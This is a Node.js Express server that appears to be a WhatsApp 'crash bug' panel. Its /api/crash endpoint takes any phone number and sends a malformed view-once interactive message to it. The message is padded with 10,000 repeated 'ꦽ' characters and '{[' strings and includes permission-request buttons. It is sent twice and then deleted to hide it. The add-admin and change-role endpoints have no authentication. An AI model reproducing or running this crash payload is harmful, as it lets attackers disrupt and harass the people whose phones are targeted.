const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY
async function FcDelMsg(target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "kntl",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(10000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          }, 
        },
      },
    },
  };

  const [janda1, janda2] = await Promise.all([
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target
    })
  ]);

  await Promise.all([
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda1 } }),
    await sock.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda2 } })
  ]);
}
//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await FcDelMsg(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
